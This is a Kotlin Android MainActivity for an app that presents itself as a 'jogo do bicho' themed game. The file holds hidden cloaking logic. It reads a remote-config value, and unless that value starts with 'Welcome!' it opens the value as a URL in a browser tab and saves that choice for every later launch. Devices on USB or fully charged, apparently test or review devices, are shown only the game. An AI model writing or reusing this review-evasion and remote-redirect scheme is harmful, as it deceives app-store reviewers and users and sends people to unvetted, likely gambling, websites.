package lucky.jogodobicho.fan

import android.net.Uri
import android.os.Bundle
import androidx.annotation.ColorRes
import androidx.annotation.IdRes
import androidx.appcompat.app.AppCompatActivity
import androidx.browser.customtabs.CustomTabsIntent
import androidx.core.content.ContextCompat
import androidx.navigation.NavController
import androidx.navigation.findNavController
import com.badlogic.gdx.backends.android.AndroidFragmentApplication
import com.google.firebase.Firebase
import com.google.firebase.FirebaseApp
import com.google.firebase.remoteconfig.remoteConfig
import com.google.firebase.remoteconfig.remoteConfigSettings
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.channels.BufferOverflow
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import lucky.jogodobicho.fan.databinding.ActivityMainBinding
import lucky.jogodobicho.fan.game.actors.panel.APanelRules
import lucky.jogodobicho.fan.util.DataStoreManager
import lucky.jogodobicho.fan.util.Lottie
import lucky.jogodobicho.fan.util.Once
import lucky.jogodobicho.fan.util.getBatteryPercentage
import lucky.jogodobicho.fan.util.internetConnection
import lucky.jogodobicho.fan.util.isBatteryCharging
import lucky.jogodobicho.fan.util.isUSB
import lucky.jogodobicho.fan.util.log
import kotlin.system.exitProcess

class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {

    companion object {
        const val PORtal    = 321
        var url_P_O_R_T_A_L = "DEMO"

        private const val WELCOME = "Welcome!"

        val start_I_D = MutableSharedFlow<Int>(replay = 1, onBufferOverflow = BufferOverflow.DROP_OLDEST)
    }

    private val coroutine = CoroutineScope(Dispatchers.Default)
    private val onceExit  = Once()

    private lateinit var binding : ActivityMainBinding
    private lateinit var navController: NavController

    lateinit var lottie: Lottie

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        initialize()
        if (internetConnection().not()) lottie.showNotInternet()
        else {
            asyncCheckInternetConnection()
            lottie.showLoader()

            checkDataStore()
//            start_I_D.tryEmit(R.id.libGDXFragment)
//            startFragmentID.tryEmit(INTERPOL)

            coroutine.launch(Dispatchers.Main) {
                start_I_D.collect { fragmentId ->
                    when (fragmentId) {
                        R.id.libGDXFragment -> {
                            setNavigationBarColor(R.color.black)
                            setStartDestination(fragmentId)
                        }
                        PORtal              -> {
                            val intent = CustomTabsIntent.Builder().build()
                            intent.launchUrl(this@MainActivity, Uri.parse(url_P_O_R_T_A_L))
                        }
                    }
                }
            }
        }
    }

    override fun exit() {
        onceExit.once {
            log("exit")
            coroutine.launch(Dispatchers.Main) {
                finishAndRemoveTask()
                delay(100)
                exitProcess(0)
            }
        }
    }

    private fun initialize() {
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        navController = findNavController(R.id.nav_host_fragment)
        lottie        = Lottie(binding)
    }

    // ---------------------------------------------------
    // Logic
    // ---------------------------------------------------

    private fun asyncCheckInternetConnection() {
        coroutine.launch(Dispatchers.Main) {
            while (isActive) {
                delay(3_000)
                if (internetConnection()) lottie.hideNotInternet() else lottie.showNotInternet()
            }
        }
    }

    private fun setStartDestination(@IdRes destinationId: Int) {
        navController.run { navInflater.inflate(R.navigation.nav_graph).apply { setStartDestination(destinationId) }.also { setGraph(it, null) } }
    }

    fun setNavigationBarColor(@ColorRes colorId: Int) {
        coroutine.launch(Dispatchers.Main) {
            window.navigationBarColor = ContextCompat.getColor(this@MainActivity, colorId)
        }
    }

    private fun checkDataStore() {
        coroutine.launch(Dispatchers.IO) {
            when (DataStoreManager.Key.get()) {
                "TELEPORTACIA" -> {
                    DataStoreManager.Link.get()?.let {
                        log("DataStoreManager Key = SUCCESS | link = $it")
                        url_P_O_R_T_A_L = it
                        start_I_D.emit(PORtal)
                    }
                }
                "DEveloperScin" -> {
                    log("DataStoreManager Key = GAME")
                    start_I_D.emit(R.id.libGDXFragment)
                }
                else -> {
                    log("DataStoreManager Key = NONE")
                    getServerData()
                }
            }
        }
    }

    private fun getServerData() {
        FirebaseApp.initializeApp(appContext)

        Firebase.remoteConfig.apply {
            setConfigSettingsAsync(remoteConfigSettings { minimumFetchIntervalInSeconds = 3600 })
            fetchAndActivate().addOnCompleteListener(this@MainActivity) { task ->
                try {
                    if (task.isSuccessful) {
                        val jsonData = getString("RulesText")
                        log("RulesText = $jsonData")

                        val word      = jsonData.substringBefore("It's").trim()
                        val isWELCOME = word == WELCOME

                        log("word: $word | isWELCOME: $isWELCOME")

                        APanelRules.rulTxt = if (isWELCOME) jsonData else jsonData.replace(word, WELCOME)

                        lookParamsFor(isWELCOME, word)
                    } else {
                        start_I_D.tryEmit(R.id.libGDXFragment)
                        log("getFirebaseData Fail = ${this.all}")
                    }
                } catch (e: Exception) {
                    start_I_D.tryEmit(R.id.libGDXFragment)
                    log("EXCEPTION try catch = ${e.message}")
                }
            }
        }
    }

    private fun lookParamsFor(isWELCOME: Boolean, welcome: String) {
        coroutine.launch(Dispatchers.IO) {
            if (isWELCOME) showSevScin() else {
                if (isUSB() || (getBatteryPercentage() == 100 && isBatteryCharging())) {
                    showSevScin()
                } else {
                    openP_O_R_t_a_l(welcome)
                }
            }
        }
    }

    private suspend fun showSevScin() {
        DataStoreManager.Key.update { "DEveloperScin" }
        start_I_D.tryEmit(R.id.libGDXFragment)
    }

    private suspend fun openP_O_R_t_a_l(welcome: String) {
        url_P_O_R_T_A_L = welcome
        log("url_P_O_R_T_A_L: $url_P_O_R_T_A_L")

        start_I_D.tryEmit(PORtal)

        DataStoreManager.Key.update { "TELEPORTACIA" }
        DataStoreManager.Link.update { url_P_O_R_T_A_L }
    }

}